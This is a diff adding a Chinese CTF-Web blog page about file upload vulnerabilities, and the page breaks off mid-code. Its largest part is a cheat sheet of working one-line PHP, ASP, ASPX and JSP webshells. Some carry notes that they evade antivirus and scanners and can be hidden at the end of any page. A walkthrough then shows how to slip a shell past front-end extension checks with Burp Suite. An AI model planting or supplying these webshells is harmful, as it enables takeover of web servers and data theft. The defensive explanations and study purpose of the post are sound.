@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<script>
+(function(){
+    if(''){
+        if (prompt('请输入文章密码') !== ''){
+            alert('密码错误！');
+            history.back();
+        }
+    }
+})();
+</script>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/aixin.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/aixin.png">
+  <link rel="mask-icon" href="/images/aixin.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-big-counter.min.css">
+  <script src="true"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hzy2003628.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+
+<script>
+(function(){
+var src = "https://s.ssl.qhres2.com/ssl/ab77b6ea7f3fbf79.js";
+document.write('<script src="' + src + '" id="sozz"><\/script>');
+})();
+</script>
+
+  <meta name="description" content="文件上传漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="https://hzy2003628.top/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="风尘孤狼">
+<meta property="og:description" content="文件上传漏洞">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-02-05T02:40:14.000Z">
+<meta property="article:modified_time" content="2022-02-05T02:56:58.068Z">
+<meta property="article:author" content="黄子元">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="文件上传漏洞">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://hzy2003628.top/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>文件上传 | 风尘孤狼</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?d1ea9671a278a2cb33e24c76d08af22f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">风尘孤狼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+        <li class="menu-item menu-item-love">
+
+    <a href="/Love/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Love</a>
+
+  </li>
+        <li class="menu-item menu-item-guestbook">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言板</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://hzy2003628.top/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="黄子元">
+      <meta itemprop="description" content="没有所谓失败，除非你不再尝试">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="风尘孤狼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件上传
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-05 10:40:14 / 修改时间：10:56:58" itemprop="dateCreated datePublished" datetime="2022-02-05T10:40:14+08:00">2022-02-05</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index"><span itemprop="name">CTF-Web</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="post-meta-item leancloud_visitors" data-flag-title="文件上传" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/02/05/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>9.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文件上传漏洞</p>
+<span id="more"></span>
+
+<p>文件上传漏洞是对用户文件上传部分的控制不足或者处理缺陷导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件，例如木马，病毒，恶意脚本以及webshell。</p>
+<h1 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h1><p>WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称之为一种网页后门。\攻击者在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器web目录下正常的网页文件混在一起，然后使用浏览器来访问这些后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载或者修改文件，操作数据库，执行任意命令等）。WebShell后门隐蔽较性高，可以轻松穿越防火墙，访问WebShell时不会留下系统日志，只会在网站的web日志中留下一些数据提交记录</p>
+<h1 id="一句话木马大全"><a href="#一句话木马大全" class="headerlink" title="一句话木马大全"></a>一句话木马大全</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">##PHP：</span><br><span class="line">&lt;?php @eval($_POST[&#x27;r00ts&#x27;]);?&gt; </span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">&lt;?php @eval($_POST[cmd]);?&gt;</span><br><span class="line">&lt;?php @eval($_REQUEST[cmd]);?&gt;</span><br><span class="line">&lt;?php assert($_REQUEST[cmd]); ?&gt;</span><br><span class="line">&lt;?php //?cmd=phpinfo() @preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;); ?&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo();</span><br><span class="line">$func =create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">$func();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//?func=system&amp;cmd=whoami</span><br><span class="line">$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array[0]=$cmd;</span><br><span class="line">$new_array=array_map($func,$array);</span><br><span class="line">//print_r($new_array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo()</span><br><span class="line">@call_user_func(assert,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//?cmd=phpinfo()</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array[0]=$cmd;</span><br><span class="line">call_user_func_array(&quot;assert&quot;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//?func=system&amp;cmd=whoami</span><br><span class="line">$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">$array1=array($cmd);</span><br><span class="line">$func =$_GET[&#x27;func&#x27;];</span><br><span class="line">array_filter($array1,$func);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php usort($_GET,&#x27;asse&#x27;.&#x27;rt&#x27;);?&gt; php环境&gt;=&lt;5.6才能用</span><br><span class="line">&lt;?php usort(...$_GET);?&gt;  php环境&gt;=5.6才能用</span><br><span class="line">&lt;?php eval($_POST1);?&gt; </span><br><span class="line">&lt;?php if(isset($_POST[&#x27;c&#x27;]))&#123;eval($_POST[&#x27;c&#x27;]);&#125;?&gt; </span><br><span class="line">&lt;?php system($_REQUEST1);?&gt; </span><br><span class="line">&lt;?php ($_=@$_GET1).@$_($_POST1)?&gt; </span><br><span class="line">&lt;?php eval_r($_POST1)?&gt; </span><br><span class="line">&lt;?php @eval_r($_POST1)?&gt;//容错代码 </span><br><span class="line">&lt;?php assert($_POST1);?&gt;//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </span><br><span class="line">&lt;?$_POST[&#x27;c&#x27;]($_POST[&#x27;cc&#x27;]);?&gt; </span><br><span class="line">&lt;?$_POST[&#x27;c&#x27;]($_POST[&#x27;cc&#x27;],$_POST[&#x27;cc&#x27;])?&gt; </span><br><span class="line">&lt;?php @preg_replace(&quot;/[email]/e&quot;,$_POST[&#x27;h&#x27;],&quot;error&quot;);?&gt;/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/:&lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; </span><br><span class="line">&lt;?php echo `$_GET[&#x27;r&#x27;]` ?&gt; </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话</span><br><span class="line"></span><br><span class="line">&lt;?php (])?&gt;   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！</span><br><span class="line"></span><br><span class="line">&lt;?if(isset($_POST[&#x27;1&#x27;]))&#123;eval($_POST[&#x27;1&#x27;]);&#125;?&gt;&lt;?php system ($_REQUEST[1]);?&gt; </span><br><span class="line">加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！</span><br><span class="line"></span><br><span class="line">&lt;%execute request(“class”)%&gt;&lt;%&#x27;&lt;% loop &lt;%:%&gt;&lt;%&#x27;&lt;% loop &lt;%:%&gt;&lt;%execute request (“class”)%&gt;&lt;%execute request(“class”)&#x27;&lt;% loop &lt;%:%&gt; </span><br><span class="line">无防下载表，有防下载表可尝试插入以下语句突破的一句话 </span><br><span class="line"></span><br><span class="line">&lt;%eval(request(“1″)):response.end%&gt; 备份专用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">##JSP：</span><br><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; </span><br><span class="line">提交客户端 </span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;textareaname=&quot;t&quot;&gt;&lt;/textarea&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot;value=&quot;提交&quot;&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">##ASP</span><br><span class="line">&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; </span><br><span class="line"></span><br><span class="line">&lt;%execute(request(“1″))%&gt; </span><br><span class="line"></span><br><span class="line">&lt;scriptrunat=server&gt;execute request(“1″)&lt;/script&gt; 不用&#x27;&lt;,&gt;‘的asp一句话 </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">##aspx</span><br><span class="line">&lt;scriptrunat=”server”&gt;WebAdmin2Y.x.y aaaaa =newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;C#&quot;runat=&quot;server&quot;&gt;WebAdmin2Y.x.y a=new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。</span><br></pre></td></tr></table></figure>
+
+<h1 id="产生文件上传漏洞的原因"><a href="#产生文件上传漏洞的原因" class="headerlink" title="产生文件上传漏洞的原因"></a>产生文件上传漏洞的原因</h1><p><strong>原因：</strong></p>
+<blockquote>
+<ul>
+<li>对于上传文件的后缀名（扩展名）没有做较为严格的限制</li>
+<li>对于上传文件的MIMETYPE(用于描述文件的类型的一种表述方法) 没有做检查</li>
+<li>权限上没有对于上传的文件目录设置不可执行权限，（尤其是对于shebang类型的文件）</li>
+<li>对于web server对于上传文件或者指定目录的行为没有做限制</li>
+</ul>
+</blockquote>
+<blockquote>
+<p><strong>原理：</strong><br>在 WEB 中进行文件上传的原理是通过将表单设为 multipart/form-data，同时加入文件域，而后通过 HTTP 协议将文件内容发送到服务器，服务器端读取这个分段 (multipart) 的数据信息，并将其中的文件内容提取出来并保存的。通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名 ( 为了防止重复 )，并且加上原始文件的扩展名来保存到服务器上</p>
+<p>文件上传后导致的常见安全问题一般有:</p>
+<ul>
+<li>上传文件是Web脚本语言，服务器的Web容器解释并执行了用户上传的脚本,导致代<br>码执行;</li>
+<li>上传文件是Flash的策略文件crossdomain.xml,黑客用以控制Flash在该域下的行为(其<br>他通过类似方式控制策略文件的情况类似);</li>
+<li>上传文件是病毒、木马文件，黑客用以诱骗用户或者管理员下载执行:</li>
+<li>上传文件是钓鱼图片或为包含了脚本的图片，在某些版本的浏览器中会被作为脚本执<br>行，被用于钓鱼和欺诈。</li>
+</ul>
+<p>除此之外，还有一些不常见的利用方法，比如将上传文件作为一个入口,溢出服务器的后台处理程序，如图片解析模块;或者上传-一个合法的文本文件， 其内容包含了PHP脚本，再通过“本地文件包含漏洞(Local File Include)”执行此脚本;等等。</p>
+</blockquote>
+<h1 id="文件上传漏洞的攻击与防御方式"><a href="#文件上传漏洞的攻击与防御方式" class="headerlink" title="文件上传漏洞的攻击与防御方式"></a>文件上传漏洞的攻击与防御方式</h1><h4 id="1-前端限制"><a href="#1-前端限制" class="headerlink" title="1.前端限制"></a>1.前端限制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;li id=&quot;show_code&quot;&gt;</span><br><span class="line">    &lt;h3&gt;代码&lt;/h3&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;code class=&quot;line-numbers language-javascript&quot;&gt;function checkFile() &#123;</span><br><span class="line">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class="line">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class="line">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    //定义允许上传的文件类型</span><br><span class="line">    var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/li&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>原理</strong></p>
+<p><strong>在表单中使用onsumbit=checkFile()调用js函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</strong></p>
+<p><strong>绕过方法</strong></p>
+<p>这种限制很简单，通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。</p>
+<p><strong>操作方法</strong></p>
+<p>准备一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>并且修改后缀名为jpg，上传操作，通过burpsuit抓包改包，使其后缀名修改回php。</p>
+<h4 id="2-检查扩展名"><a href="#2-检查扩展名" class="headerlink" title="2.检查扩展名"></a>2.检查扩展名</h4><p><strong>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传</strong><br>在检查扩展名是否合法的时候，有两种策略：</p>
+<h5 id="1-黑名单策略，"><a href="#1-黑名单策略，" class="headerlink" title="1.黑名单策略，"></a>1.黑名单策略，</h5><p>文件扩展名在黑名单中的为不合法<br><strong>示例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">//黑名单策略</span><br><span class="line">&lt;li id=&quot;show_code&quot;&gt;</span><br><span class="line">    &lt;h3&gt;代码&lt;/h3&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/code&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">12345678910111213141516171819202122232425262728293031323334</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-白名单策略"><a href="#2-白名单策略" class="headerlink" title="2.白名单策略"></a>2.白名单策略</h5><p>文件扩展名不在白名单中的均为不合法<br><strong>示例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;li id=&quot;show_code&quot;&gt;</span><br><span class="line">    &lt;h3&gt;代码&lt;/h3&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">&lt;code class=&quot;line-numbers language-php&quot;&gt;$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_ext = 